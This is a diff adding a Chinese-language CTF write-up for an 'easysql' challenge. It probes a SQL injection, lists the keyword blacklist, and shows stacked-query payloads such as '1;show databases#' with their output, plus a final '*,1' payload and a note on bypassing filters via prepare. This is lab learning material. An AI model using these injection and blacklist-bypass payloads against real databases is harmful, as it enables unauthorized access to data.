@@ -186,6 +186,95 @@ set global log_output='file';   -- 设置输出类型为file
 
 emmmmmm,flag在根目录
 
+### easysql
+
+猜测sql语句类似:`select xx from xx where xx=query`
+
+`select query from xxxx;`
+
+输出:
+
+too long,nonono,结果
+
+长度限制:40
+
+黑名单:`sleep,or,",from,where,outfile`
+
+奇怪的输出
+
+`123`=>`1`
+
+`123#`=>`123`
+
+由这两个可以猜测sql语句类似
+
+`select query from xxxx;`
+
+`database();select%201%23`
+
+结果
+
+```
+Array
+(
+    [0] => ctf
+)
+Array
+(
+    [0] => 1
+)
+```
+
+可以执行多个sql语句,可以试着用prepare绕过黑名单////禁用from................
+
+`1;show%20databases%23`
+
+```
+
+Array
+(
+    [0] => 1
+)
+Array
+(
+    [0] => ctf
+)
+Array
+(
+    [0] => ctftraining
+)
+Array
+(
+    [0] => information_schema
+)
+Array
+(
+    [0] => mysql
+)
+Array
+(
+    [0] => performance_schema
+)
+Array
+(
+    [0] => test
+)
+```
+
+
+
+可在了禁了from上
+
+后来看到` Give me your flag, I will tell you if the flag is right. `
+
+并且flag存在表里,所以应该有from Flag
+
+构造payload :`*,1`
+
+
+
+
+
 ## jarvisoj
 
 ### re?
